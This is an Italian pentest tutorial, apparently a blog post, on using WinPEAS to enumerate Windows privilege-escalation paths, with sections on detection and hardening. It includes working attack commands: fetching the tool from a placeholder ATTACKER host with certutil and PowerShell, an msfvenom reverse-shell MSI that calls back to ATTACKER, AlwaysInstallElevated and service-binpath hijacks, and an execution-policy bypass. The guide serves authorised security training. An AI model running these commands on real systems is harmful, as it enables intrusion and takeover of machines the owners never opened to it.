---
title: 'WinPEAS: Comandi e Privilege Escalation su Windows'
slug: winpeas
description: |
  WinPEAS per Windows privesc: comandi, enumerazione e output per individuare servizi vulnerabili, credenziali esposte e misconfig per la privilege escalation.
image: /winpeas-windows-privilege-escalation-hackita.webp
draft: false
date: 2026-04-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - winpeas
  - windows privilege escalation
  - windows pentesting
  - post exploitation
---

# WinPEAS su Windows: Come Eseguirlo e Analizzare i Risultati

WinPEAS (Windows Privilege Escalation Awesome Script) è lo strumento della famiglia PEASS-ng che enumera configurazioni, servizi, permessi, credenziali salvate e file interessanti su un sistema Windows. Non sfrutta nulla da solo: ti segnala **punti da verificare** per capire se esiste un percorso da utente standard verso Administrator o SYSTEM.

Questa guida è pensata per lab, CTF e pentest autorizzati (Hack The Box, OSCP/OSCE, ambienti di test). Trovi: download, comandi, moduli, lettura dell'output, i vettori più comuni con verifica manuale e la parte di detection.

## Comandi Essenziali

| Obiettivo                        | Comando                                           |
| -------------------------------- | ------------------------------------------------- |
| Help                             | `winPEASx64.exe -h`                               |
| Tutti i check (default)          | `winPEASx64.exe`                                  |
| Solo alcuni moduli               | `winPEASx64.exe systeminfo userinfo servicesinfo` |
| Senza colori (no color)          | `winPEASx64.exe notcolor`                         |
| Senza banner                     | `winPEASx64.exe quiet`                            |
| Includere info di dominio        | `winPEASx64.exe domain`                           |
| Pausa tra i check                | `winPEASx64.exe wait`                             |
| Output su file                   | `winPEASx64.exe notcolor > out.txt`               |
| Cercare più file con credenziali | `winPEASx64.exe searchall`                        |

Gli argomenti cambiano tra le release: controlla sempre `-h` sulla versione che hai scaricato.

## Cos'è WinPEAS e Come Funziona

WinPEAS fa parte del progetto [PEASS-ng](https://github.com/peass-ng/PEASS-ng), lo stesso di [LinPEAS](https://hackita.it/articoli/linpeas/) per Linux. Esiste in tre forme:

| Versione    | Cosa è                               | Note                                                                  |
| ----------- | ------------------------------------ | --------------------------------------------------------------------- |
| `.exe` (C#) | La versione completa e più mantenuta | Richiede .NET Framework 4.5.2 o superiore                             |
| `.bat`      | Script batch                         | Nessuna dipendenza, ma meno check e nessun output colorato come l'exe |
| `.ps1`      | Script PowerShell                    | Dipende da policy di esecuzione e controlli come AMSI                 |

Per le release `.exe` trovi build **x64**, **x86** e **Any CPU**, offuscate e non offuscate: scegli in base all'architettura del target (`echo %PROCESSOR_ARCHITECTURE%`). Il README ufficiale avvisa che Defender può eliminare la build non offuscata.

Il suo posto nel flusso di lavoro: dopo aver ottenuto una shell da utente standard, durante la fase di [enumeration](https://hackita.it/articoli/enumeration/) di [post-exploitation](https://hackita.it/articoli/post-exploitation/), prima di scegliere una tecnica di [privilege escalation su Windows](https://hackita.it/articoli/privilege-escalation-windows/). Per la checklist manuale completa, vedi anche [Windows Privilege Escalation](https://hackita.it/articoli/windowsprivilegeescalation/).

## Download e Trasferimento sul Target

Scarica sempre dalla pagina Releases del repository ufficiale (peass-ng) e verifica il nome dell'asset: cambia tra le release.

```bash
# Sul tuo host (Kali): scarica l'asset dalla pagina Releases e servilo
python3 -m http.server 80
```

Sul target hai due opzioni native, senza tool esterni:

```powershell
# PowerShell
iwr http://ATTACKER/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
```

```cmd
:: CMD con certutil
certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe C:\Windows\Temp\wp.exe
```

Su [PowerShell](https://hackita.it/articoli/powershell/) e [certutil](https://hackita.it/articoli/certutilexe/) trovi dettagli e alternative; se la rete è filtrata, guarda anche i [LOLBins](https://hackita.it/articoli/lolbins/) per il trasferimento file.

## Esecuzione e Moduli

```cmd
:: Help (valido anche --help)
wp.exe -h

:: Esecuzione completa
wp.exe

:: Solo i moduli che ti servono
wp.exe systeminfo userinfo servicesinfo windowscreds
```

Moduli presenti nel codice sorgente attuale:

| Modulo             | Cosa controlla                                                                                |
| ------------------ | --------------------------------------------------------------------------------------------- |
| `systeminfo`       | OS, patch, UAC, LSA, protezioni                                                               |
| `userinfo`         | Utenti, gruppi, privilegi del token                                                           |
| `processinfo`      | Processi e permessi dei binari                                                                |
| `servicesinfo`     | Servizi, ACL, path non quotati, binari modificabili                                           |
| `applicationsinfo` | Software installato, [task pianificati](https://hackita.it/articoli/scheduled-task/), autorun |
| `networkinfo`      | Connessioni, share, firewall, interfacce                                                      |
| `windowscreds`     | Credenziali salvate, autologon, Wi-Fi, vault                                                  |
| `browserinfo`      | Cronologia e dati dei browser                                                                 |
| `filesinfo`        | File interessanti                                                                             |
| `eventsinfo`       | Eventi di logon e PowerShell                                                                  |

Alcune opzioni sono più lente o fanno più rumore (`searchall`, `-lolbas`, `-vulnpackages`, `-linpeas`): usale solo quando servono. `-vulnpackages` invia nomi e versioni dei pacchetti a un servizio online di HackTricks: nei lab va bene, in un engagement reale verifica prima cosa è consentito.

### WinPEAS senza colori (no color)

L'argomento `notcolor` disattiva le sequenze ANSI: l'output è testo semplice, senza codici strani e senza evidenziazioni rosse/verdi.

```cmd
wp.exe notcolor
```

Quando usarlo:

* console che non supporta ANSI (vedi sotto)
* output da salvare in un file di testo pulito
* reverse shell o terminali che stampano caratteri illeggibili

Il compromesso: perdi l'evidenziazione che guida la lettura. Cerca a mano i punti importanti, per esempio con `findstr`:

```cmd
wp.exe notcolor > C:\Windows\Temp\out.txt
findstr /i "unquoted modifiable password" C:\Windows\Temp\out.txt
```

Se invece vuoi salvare **con** i colori, apri il file con un viewer che li supporta (per esempio `less -R` su Linux).

Esiste anche `winPEAS.bat`, che non usa i colori come l'exe, ma ha meno check: non è l'equivalente di `notcolor`.

## Come Leggere l'Output

Il colore guida l'attenzione, non dà un verdetto. Secondo il README ufficiale:

* **Rosso**: qualcosa di interessante dal punto di vista del pentester.
* **Verde**: qualcosa di ben configurato dal punto di vista del difensore.

La legenda completa è nell'immagine del README di PEASS-ng: verificala sulla tua versione. Un risultato evidenziato **non è una vulnerabilità confermata**: va validato a mano (permessi reali, contesto, possibilità di riavviare il servizio, falsi positivi).

### Output a colori non funziona

Se vedi sequenze strane tipo `←[1;31m`, la console non interpreta le sequenze ANSI. Dal README ufficiale:

```cmd
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Poi apri una **nuova** finestra CMD. In alternativa usa `notcolor` (vedi sezione "WinPEAS senza colori").

## Vettori Principali (con Verifica Manuale)

Gli output seguenti sono **esempi sintetici** costruiti per spiegare il formato: non sono acquisizioni reali.

### Unquoted Service Path

Un servizio con `PathName` non tra virgolette e con spazi:

```
C:\Apps\Update Manager\service.exe
```

Windows prova in ordine questi percorsi:

```
C:\Apps\Update.exe
C:\Apps\Update Manager\service.exe
```

Per sfruttarlo non basta vedere il path: ti serve **scrittura nella directory dove metti il file**, cioè `C:\Apps` e non `C:\Apps\Update Manager`. Verifica prima la directory giusta:

```cmd
sc qc UpdateService
icacls "C:\Apps"
```

Se `C:\Apps` è scrivibile dal tuo utente (per esempio `BUILTIN\Users:(W)`), nel lab puoi posizionare `Update.exe` e riavviare il servizio. Servono anche i diritti per fermare/avviare il servizio o un reboot. Le directory di sistema come `C:\Program Files` non sono normalmente scrivibili da utenti standard: se il path passa da lì, di solito il vettore non è sfruttabile.

### Weak Service Permissions

WinPEAS segnala servizi che l'utente può modificare. Verifica con `sc qc` e con gli ACL del servizio, poi nel lab:

```cmd
sc config WeakService binpath= "C:\Windows\Temp\svc.exe"
sc stop WeakService
sc start WeakService
```

Nota: un servizio si aspetta un binario di tipo servizio (`msfvenom -f exe-service`); un `.exe` normale parte ma il servizio va in timeout. Servono i diritti `SERVICE_CHANGE_CONFIG` e quelli per avvio/stop.

### AlwaysInstallElevated

Il vettore è valido solo se **entrambe** le chiavi sono a `1`:

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Se lo sono, nel lab un MSI viene eseguito con privilegi elevati:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o shell.msi
```

```cmd
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```

### Credenziali Salvate

`cmdkey /list` mostra solo che esiste una voce salvata, non la password:

```cmd
cmdkey /list
```

Se un target è salvato con un utente privilegiato, puoi provare `runas /savecred /user:UTENTE cmd.exe`, ma funziona solo se la credenziale salvata corrisponde a quell'utente. Per estrarre segreti guarda [credential dumping](https://hackita.it/articoli/credential-dumping/), [Mimikatz](https://hackita.it/articoli/mimikatz/), [LaZagne](https://hackita.it/articoli/lazagne/) e, per le credenziali protette da DPAPI, [DPAPI](https://hackita.it/articoli/dpapi/) e [SharpDPAPI](https://hackita.it/articoli/sharpdpapi/), sempre in lab.

### Privilegi del Token

Nella sezione `userinfo` WinPEAS elenca i privilegi del token. Se ne trovi uno abilitato, approfondisci quello specifico:

| Privilegio                                 | Guida                                                                                                                                       |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `SeImpersonatePrivilege`                   | [SeImpersonatePrivilege](https://hackita.it/articoli/seimpersonateprivilege/)                                                               |
| `SeAssignPrimaryTokenPrivilege`            | [SeAssignPrimaryTokenPrivilege](https://hackita.it/articoli/seassignprimarytokenprivilege/)                                                 |
| `SeDebugPrivilege`                         | [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege/)                                                                           |
| `SeBackupPrivilege` / `SeRestorePrivilege` | [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege/) e [SeRestorePrivilege](https://hackita.it/articoli/serestoreprivilege/) |
| `SeTakeOwnershipPrivilege`                 | [SeTakeOwnershipPrivilege](https://hackita.it/articoli/setakeownershipprivilege/)                                                           |
| `SeLoadDriverPrivilege`                    | [SeLoadDriverPrivilege](https://hackita.it/articoli/seloaddriverprivilege/)                                                                 |

Un privilegio presente ma **disabilitato** nel token non è utilizzabile così com'è: verifica lo stato con `whoami /priv`.

## Scenario di Lab: Dall'Enumeration alla Verifica

1. Shell da utente standard sul target del lab.
2. `wp.exe systeminfo userinfo servicesinfo windowscreds` e salva l'output.
3. Per ogni riga rossa: conferma a mano (ACL con `icacls`, config con `sc qc`, registry con `reg query`).
4. Scegli un solo vettore confermato, sfruttalo, verifica con `whoami /all`.
5. Solo dopo, passa al credential access o al movimento laterale ([PsExec](https://hackita.it/articoli/psexec/)).

Se hai accesso a un dominio, la parte di relazioni AD non è di WinPEAS: usa [BloodHound](https://hackita.it/articoli/bloodhound/). WinPEAS guarda l'host locale (l'opzione `domain` aggiunge solo qualche informazione di dominio).

## WinPEAS vs Altri Strumenti

Non sono strumenti in competizione: dipende cosa ti serve.

| Strumento                                         | A cosa serve                                                         | Quando sceglierlo                          |
| ------------------------------------------------- | -------------------------------------------------------------------- | ------------------------------------------ |
| WinPEAS                                           | Enumeration ampia di misconfiguration locali, output già evidenziato | Prima passata completa su un host          |
| [Seatbelt](https://hackita.it/articoli/seatbelt/) | Controlli mirati di sicurezza host in C#                             | Controlli specifici e leggibili da parsare |
| [SharpUp](https://hackita.it/articoli/sharpup/)   | Controlli di privilege escalation (porting di PowerUp)               | Verifica rapida dei vettori classici       |
| [JAWS](https://hackita.it/articoli/jaws/)         | Enumeration in PowerShell puro                                       | Target vecchi con solo PowerShell          |
| [WinEnum](https://hackita.it/articoli/winenum/)   | Enumeration Windows da script                                        | Panoramica rapida dell'host                |
| [LinPEAS](https://hackita.it/articoli/linpeas/)   | Stessa idea per Linux                                                | Target Linux                               |

Confrontali sulla tua versione e nel tuo lab: copertura e rumore cambiano con le release. Se hai una sessione [Metasploit](https://hackita.it/articoli/metasploit/), puoi affiancare un local exploit suggester, ma resta un suggerimento da verificare, non un exploit automatico.

## Detection: Cosa Vede il Blue Team

WinPEAS è rumoroso per natura: legge molto in poco tempo. Cosa osservare lato difensore:

| Telemetria                                | Cosa cercare                                                                       |
| ----------------------------------------- | ---------------------------------------------------------------------------------- |
| Creazione processi (Event 4688, Sysmon 1) | Binario sconosciuto in `Temp` che lancia `sc`, `reg`, `cmdkey`, `icacls`, `whoami` |
| Accessi a registro e servizi              | Raffiche di query su chiavi di servizi, Installer, Winlogon, credenziali           |
| Alert Defender/EDR                        | Rilevamento della firma di PEASS o di PowerShell caricato in memoria               |
| Script PowerShell (Event 4104, AMSI)      | Script block logging con contenuto del `.ps1`                                      |
| Cambi di configurazione (7045, 4697)      | Servizi creati o modificati dopo l'enumeration                                     |
| Rete                                      | Download di `winPEAS*.exe` da host interni o web server anomali                    |

Se sei in un lab con Blue Team, usa questi eventi per capire cosa lascia il tool. Per l'hardening: rimuovi `AlwaysInstallElevated`, quota i path dei servizi, restringi gli ACL su servizi e directory, elimina credenziali salvate non necessarie e abilita logging di processi e PowerShell.

## Risoluzione dei Problemi

| Problema                     | Causa probabile                        | Cosa fare                                                                                              |
| ---------------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| Non parte                    | Architettura sbagliata o .NET \< 4.5.2 | Controlla `%PROCESSOR_ARCHITECTURE%` e la versione di .NET                                             |
| Caratteri strani nell'output | Console senza ANSI                     | `VirtualTerminalLevel` oppure `notcolor`                                                               |
| Troppo output                | Esecuzione completa                    | Usa moduli singoli (`servicesinfo`, `windowscreds`)                                                    |
| File cancellato subito       | Antivirus/Defender                     | Nel lab usa una build diversa o un'esclusione autorizzata; in un engagement segui le regole concordate |
| `.ps1` non parte             | Execution Policy o AMSI                | `powershell -ep bypass` nel lab; l'errore può dipendere dai controlli, non dal tool                    |

## Checklist

* Architettura e .NET verificati prima dell'esecuzione
* Download dal repository ufficiale (peass-ng) e `-h` controllato
* Moduli limitati a quello che serve
* Ogni riga rossa verificata a mano
* Un solo vettore alla volta, confermato con `whoami /all`
* Output salvato e dati sensibili protetti

## FAQ

**WinPEAS fa privilege escalation da solo?**
No. Enumera e segnala. L'escalation la fai tu dopo la verifica manuale.

**Serve essere admin per eseguirlo?**
No, parte come utente standard. Alcuni check restituiscono più dati con privilegi più alti.

**Cosa significa un risultato rosso?**
Che è interessante per un pentester. Non è una vulnerabilità confermata.

**Quanto tempo richiede?**
Dipende dal sistema e dai moduli attivi. Con `filesinfo` o `searchall` è molto più lento.

**Qual è la differenza tra WinPEAS e LinPEAS?**
WinPEAS è per Windows, [LinPEAS](https://hackita.it/articoli/linpeas/) per Linux. Stessa famiglia, controlli diversi.

**WinPEAS lascia tracce?**
Sì: esecuzione del processo, query di registro e servizi, file su disco, eventi di logging. Non dare per scontato che sia invisibile.

**È legale?**
Usalo solo su sistemi di tua proprietà o con autorizzazione scritta, o in lab dedicati.

## Risorse

* [PEASS-ng: repository ufficiale](https://github.com/peass-ng/PEASS-ng)
* [HackTricks: Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*
